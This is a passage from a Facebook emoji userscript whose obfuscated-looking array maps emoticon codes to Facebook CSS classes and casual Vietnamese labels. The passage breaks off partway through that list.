// ==UserScript==
// @name            Facebook Emoji For Chat,Comments and Post.. 
Easly Comment And Chat With Emoji Codes 2014
// @description     All about facebook By Nhok Sieu Wuay
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function () {
    if (!document['querySelector']('#pageNav')) {
        return;
    };
    var _0x3384x1 = [{
        "\x63\x68\x61\x72\x73": ' :) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_smile',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi t\u01B0\u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' :( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_frown',
        "\x6E\x61\x6D\x65": 'Bu\u1ED3n ch\xE1n'
    }, {
        "\x63\x68\x61\x72\x73": ' :P ',
        "\x63\x6C\x61\x73\x73": 'emoticon_tongue',
        "\x6E\x61\x6D\x65": 'L\xE8 l\u01B0\u1EE1i'
    }, {
        "\x63\x68\x61\x72\x73": ' :D ',
        "\x63\x6C\x61\x73\x73": 'emoticon_grin',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi toe'
    }, {
        "\x63\x68\x61\x72\x73": ' :o ',
        "\x63\x6C\x61\x73\x73": 'emoticon_gasp',
        "\x6E\x61\x6D\x65": 'Ng\u1EA1c nhi\xEAn'
    }, {
        "\x63\x68\x61\x72\x73": ' ;) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_wink',
        "\x6E\x61\x6D\x65": 'Nh\xE1y m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' :v ',
        "\x63\x6C\x61\x73\x73": 'emoticon_pacman',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi h\xE1 mi\u1EC7ng'
    }, {
        "\x63\x68\x61\x72\x73": ' >:( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_grumpy',
        "\x6E\x61\x6D\x65": 'Nh\u0103n m\u1EB7t'
    }, {
        "\x63\x68\x61\x72\x73": ' :/ ',
        "\x63\x6C\x61\x73\x73": 'emoticon_unsure',
        "\x6E\x61\x6D\x65": 'M\u1EBFu'
    }, {
        "\x63\x68\x61\x72\x73": ' :\'( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_cry',
        "\x6E\x61\x6D\x65": 'Kh\xF3c'
    }, {
        "\x63\x68\x61\x72\x73": ' ^_^ ',
        "\x63\x6C\x61\x73\x73": 'emoticon_kiki',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi t\xEDt m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' 8) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_glasses',
        "\x6E\x61\x6D\x65": '\u0110eo k\xEDnh tr\u1EAFng'
    }, {
        "\x63\x68\x61\x72\x73": ' B| ',
        "\x63\x6C\x61\x73\x73": 'emoticon_sunglasses',
        "\x6E\x61\x6D\x65": '\u0110eo k\xEDnh \u0111en'
    }, {
        "\x63\x68\x61\x72\x73": ' <3 ',
        "\x63\x6C\x61\x73\x73": 'emoticon_heart',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim'
    }, {
        "\x63\x68\x61\x72\x73": ' 3:) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_devil',
        "\x6E\x61\x6D\x65": 'Qu\u1EF7 s\u1EE9'
    }, {
        "\x63\x68\x61\x72\x73": ' O:) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_angel',
        "\x6E\x61\x6D\x65": 'Thi\xEAn th\u1EA7n'
    }, {
        "\x63\x68\x61\x72\x73": ' -_- ',
        "\x63\x6C\x61\x73\x73": 'emoticon_squint',
        "\x6E\x61\x6D\x65": 'Nh\u1EAFm m\u1EAFt l\u1EA1i'
    }, {
        "\x63\x68\x61\x72\x73": ' o.O ',
        "\x63\x6C\x61\x73\x73": 'emoticon_confused',
        "\x6E\x61\x6D\x65": 'Tr\u1EE3n tr\xF2n m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' >:o ',
        "\x63\x6C\x61\x73\x73": 'emoticon_upset',
        "\x6E\x61\x6D\x65": 'Kh\xF3 ch\u1ECBu qu\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' :3 ',
        "\x63\x6C\x61\x73\x73": 'emoticon_colonthree',
        "\x6E\x61\x6D\x65": 'Kh\xF4ng quan t\xE2m'
    }, {
        "\x63\x68\x61\x72\x73": ' (y) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_like',
        "\x6E\x61\x6D\x65": 'Th\xEDch'
    }, {
        "\x63\x68\x61\x72\x73": ' :* ',
        "\x63\x6C\x61\x73\x73": 'emoticon emoticon_kiss',
        "\x6E\x61\x6D\x65": 'H\xF4n c\xE1i coi'
    }, {
        "\x63\x68\x61\x72\x73": ' (^^^) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_shark',
        "\x6E\x61\x6D\x65": 'C\xE1 heo t\u1EE9c gi\u1EADn'
    }, {
        "\x63\x68\x61\x72\x73": ' :|] ',
        "\x63\x6C\x61\x73\x73": 'emoticon_robot',
        "\x6E\x61\x6D\x65": 'Robot'
    }, {
        "\x63\x68\x61\x72\x73": ' <(") ',
        "\x63\x6C\x61\x73\x73": 'emoticon_penguin',
        "\x6E\x61\x6D\x65": 'Chim c\xE1nh c\u1EE5t'
    }, {
        "\x63\x68\x61\x72\x73": ' :poop: ',
        "\x63\x6C\x61\x73\x73": 'emoticon_poop',
        "\x6E\x61\x6D\x65": '\u0102n shit nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' :putnam: ',
        "\x63\x6C\x61\x73\x73": 'emoticon_putnam',
        "\x6E\x61\x6D\x65": 'Th\u1EBF c\u01A1 \xE1?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF02 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c0',
        "\x6E\x61\x6D\x65": 'M\u01B0a r\u1ED3i, \xF4 n\xE8'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF0A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c1',
        "\x6E\x61\x6D\x65": 'S\xF3ng bi\u1EC3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF19 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c2',
        "\x6E\x61\x6D\x65": 'V\u1EA7ng tr\u0103ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF1F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c3',
        "\x6E\x61\x6D\x65": 'Ng\xF4i sao'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c4',
        "\x6E\x61\x6D\x65": 'C\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF34 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c5',
        "\x6E\x61\x6D\x65": 'C\xE2y c\xF4 \u0111\u01A1n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c6',
        "\x6E\x61\x6D\x65": 'X\u01B0\u01A1ng r\u1ED3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c7',
        "\x6E\x61\x6D\x65": 'Hoa Tulip'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c8',
        "\x6E\x61\x6D\x65": 'Hoa 5 c\xE1nh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c9',
        "\x6E\x61\x6D\x65": 'Hoa h\u1ED3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ca',
        "\x6E\x61\x6D\x65": 'C\xE2y hoa tr\xF2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cb',
        "\x6E\x61\x6D\x65": 'Hoa h\u01B0\u1EDBng d\u01B0\u01A1ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cc',
        "\x6E\x61\x6D\x65": 'C\xE2y l\xFAa'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cd',
        "\x6E\x61\x6D\x65": 'Hoa 4 m\xF9a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF41 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ce',
        "\x6E\x61\x6D\x65": 'L\xE1 phong'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF42 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cf',
        "\x6E\x61\x6D\x65": 'L\xE1 Fallen'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF43 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cg',
        "\x6E\x61\x6D\x65": 'L\xE1 xanh tr\u01B0\u1EDBc gi\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF4A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ch',
        "\x6E\x61\x6D\x65": 'Qu\u1EA3 qu\xFDt'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF4E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ci',
        "\x6E\x61\x6D\x65": 'T\xE1o \u0111\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF53 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cj',
        "\x6E\x61\x6D\x65": 'D\xE2u t\xE2y, \u0103n \u0111i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF54 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ck',
        "\x6E\x61\x6D\x65": 'B\xE1nh m\u1EF3 ba t\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF78 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cl',
        "\x6E\x61\x6D\x65": 'N\u01B0\u1EDBc hoa qu\u1EA3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF7A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cm',
        "\x6E\x61\x6D\x65": 'Bia'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF81 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cn',
        "\x6E\x61\x6D\x65": 'H\u1ED9p qu\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF83 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2co',
        "\x6E\x61\x6D\x65": 'Qu\u1EA3 b\xED ng\xF4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF84 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cp',
        "\x6E\x61\x6D\x65": 'C\xE2y th\xF4ng Noel'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF85 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cq',
        "\x6E\x61\x6D\x65": '\xD4ng gi\xE0 Noel'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF88 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cr',
        "\x6E\x61\x6D\x65": 'B\xF3ng bay'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF89 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cs',
        "\x6E\x61\x6D\x65": 'K\xE8n cho Party'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ct',
        "\x6E\x61\x6D\x65": 'V\u01B0\u01A1ng mi\u1EC7ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cu',
        "\x6E\x61\x6D\x65": 'C\u1EB7p \u0111\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cv',
        "\x6E\x61\x6D\x65": '\u0110\xF4i c\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF90 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cw',
        "\x6E\x61\x6D\x65": 'K\u1EB9o gi\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF93 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cx',
        "\x6E\x61\x6D\x65": 'M\u0169 c\u1EED nh\xE2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFB5 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cy',
        "\x6E\x61\x6D\x65": 'B\u1EA3n nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFB6 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cz',
        "\x6E\x61\x6D\x65": 'N\u1ED1t nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFBC ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c-',
        "\x6E\x61\x6D\x65": '\xC2m nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC0D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c_',
        "\x6E\x61\x6D\x65": 'Con r\u1EAFn'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC0E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d0',
        "\x6E\x61\x6D\x65": 'Con ng\u1EF1a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC11 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d1',
        "\x6E\x61\x6D\x65": 'Con d\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC12 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d2',
        "\x6E\x61\x6D\x65": 'Con khi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d3',
        "\x6E\x61\x6D\x65": 'Con g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC17 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d4',
        "\x6E\x61\x6D\x65": 'Con l\u1EE3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC18 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d5',
        "\x6E\x61\x6D\x65": 'Con voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC19 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d6',
        "\x6E\x61\x6D\x65": 'Con b\u1EA1ch tu\u1ED9c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d7',
        "\x6E\x61\x6D\x65": 'Con \u1ED1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d8',
        "\x6E\x61\x6D\x65": 'Con ch\u0103n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d9',
        "\x6E\x61\x6D\x65": 'Con c\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC20 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2da',
        "\x6E\x61\x6D\x65": 'C\xE1 c\u1EA3nh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC21 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2db',
        "\x6E\x61\x6D\x65": 'C\xE1 mang ph\xECnh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC25 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dc',
        "\x6E\x61\x6D\x65": 'G\xE0 con'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC26 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dd',
        "\x6E\x61\x6D\x65": 'Con chim'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC27 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2de',
        "\x6E\x61\x6D\x65": 'Chim c\xE1nh c\u1EE5t 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC28 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2df',
        "\x6E\x61\x6D\x65": 'G\u1EA5u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC29 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dg',
        "\x6E\x61\x6D\x65": 'Ch\xF3 th\xE8 l\u01B0\u1EE1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dh',
        "\x6E\x61\x6D\x65": 'Con l\u1EA1c \u0111\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2di',
        "\x6E\x61\x6D\x65": 'Con c\xE1 voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dj',
        "\x6E\x61\x6D\x65": 'M\u1EB7t chu\u1ED9t'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dk',
        "\x6E\x61\x6D\x65": 'M\u1EB7t b\xF2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dl',
        "\x6E\x61\x6D\x65": 'M\u1EB7t m\xE8o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC30 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dm',
        "\x6E\x61\x6D\x65": 'M\u1EB7t th\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dn',
        "\x6E\x61\x6D\x65": 'M\u1EB7t m\xE8o l\u01B0\u1EDDi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC33 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2do',
        "\x6E\x61\x6D\x65": 'C\xE1 voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC34 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dp',
        "\x6E\x61\x6D\x65": 'M\u1EB7t ng\u1EF1a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dq',
        "\x6E\x61\x6D\x65": 'M\u1EB7t kh\u1EC9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dr',
        "\x6E\x61\x6D\x65": 'M\u1EB7t l\u1EE3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ds',
        "\x6E\x61\x6D\x65": 'M\u1EB7t \u1EBFch'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dt',
        "\x6E\x61\x6D\x65": 'M\u1EB7t chu\u1ED9t Hamster'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2du',
        "\x6E\x61\x6D\x65": 'M\u1EB7t ch\xF3 s\xF3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dv',
        "\x6E\x61\x6D\x65": 'M\u1EB7t g\u1EA5u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dw',
        "\x6E\x61\x6D\x65": 'B\xE0n ch\xE2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dx',
        "\x6E\x61\x6D\x65": 'Ng\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC42 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dy',
        "\x6E\x61\x6D\x65": 'H\xF3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC43 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dz',
        "\x6E\x61\x6D\x65": 'M\u0169i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC44 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d-',
        "\x6E\x61\x6D\x65": 'H\xF4n mi\u1EBFng n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC45 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d_',
        "\x6E\x61\x6D\x65": 'Te t\u1EDFn'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC46 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e0',
        "\x6E\x61\x6D\x65": '\u0110\u1EE9a comment \u1EDF tr\xEAn r\u1EA5t g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC47 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e1',
        "\x6E\x61\x6D\x65": '\u0110\u1EE9a comment \u1EDF d\u01B0\u1EDBi r\u1EA5t g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC48 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e2',
        "\x6E\x61\x6D\x65": 'B\xEAn tr\xE1i em \u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC49 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e3',
        "\x6E\x61\x6D\x65": 'B\xEAn ph\u1EA3i em \u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e4',
        "\x6E\x61\x6D\x65": 'N\xE0y th\xEC nh\xECn \u0111\u1EC3u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e5',
        "\x6E\x61\x6D\x65": 'V\u1ED7 tay ngay & lu\xF4n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e6',
        "\x6E\x61\x6D\x65": 'OK, anh hi\u1EC3u r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e7',
        "\x6E\x61\x6D\x65": '\u01AFng \xFD c\u1EE7a th\xEDm r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e8',
        "\x6E\x61\x6D\x65": '\xDD th\xEDm nh\u01B0 ***'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e9',
        "\x6E\x61\x6D\x65": '\u1EE6ng h\u1ED9 nhi\u1EC7t t\xECnh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC50 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ea',
        "\x6E\x61\x6D\x65": 'C\xF2ng tay em l\u1EA1i \u0111i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC66 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eb',
        "\x6E\x61\x6D\x65": 'HOT Boy'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC67 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ec',
        "\x6E\x61\x6D\x65": 'HOT Girl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC68 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ed',
        "\x6E\x61\x6D\x65": 'X - Men'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC69 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ee',
        "\x6E\x61\x6D\x65": 'Ph\u1EE5 n\u1EEF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ef',
        "\x6E\x61\x6D\x65": 'N\u1EAFm tay c\xE1i xem n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eg',
        "\x6E\x61\x6D\x65": 'Gi\u1EDD c\xE1c th\xEDm mu\u1ED1n g\xEC? C\u1EA3nh s\xE1t \u0111\xE2y'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eh',
        "\x6E\x61\x6D\x65": 'M\u1EDBi t\u1EADu c\xE1i tai th\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC71 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ei',
        "\x6E\x61\x6D\x65": '\u0110\u1EA7u m\u1EDBi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC72 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ej',
        "\x6E\x61\x6D\x65": 'Nh\xECn c\u0169ng \u0111\u1EADp chai ph\u1EBFt'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC73 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ek',
        "\x6E\x61\x6D\x65": '\u0110\xE2y \u0111\u1EADp h\u01A1n nha c\u01B0ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC74 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2el',
        "\x6E\x61\x6D\x65": '\u1EEA, c\xF2n m\xECnh th\xEC gi\xE0 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC75 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2em',
        "\x6E\x61\x6D\x65": 'Em c\u0169ng gi\xE0 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC76 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2en',
        "\x6E\x61\x6D\x65": 'M\xECnh c\xF2n nh\u1ECF qu\xE1, ch\u1ECBu kh\xF3 FA v\u1EADy'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC77 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eo',
        "\x6E\x61\x6D\x65": '\u0110\u1ED9i m\u0169 \u0111i l\xE0m n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC78 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ep',
        "\x6E\x61\x6D\x65": 'C\xF4ng ch\xFAa'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eq',
        "\x6E\x61\x6D\x65": 'Ma \u0111\xE2y, xo\u1EAFn ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2er',
        "\x6E\x61\x6D\x65": 'Em l\xE0 thi\xEAn th\u1EA7n, nh\xECn em gi\u1ED1ng con \u0111\u1EA7n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2es',
        "\x6E\x61\x6D\x65": 'H\u1ED5 b\xE1o th\u1EBF n\xE0y \u0111\u01B0\u1EE3c ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2et',
        "\x6E\x61\x6D\x65": 'H\u1ED5 b\xE1o t\u1EEB m\u1EABu gi\xE1o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eu',
        "\x6E\x61\x6D\x65": '\u0110\u1EE7 c\u1EE9ng ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC80 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ev',
        "\x6E\x61\x6D\x65": '\u0110\u1EA7u l\xE2u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC82 ',
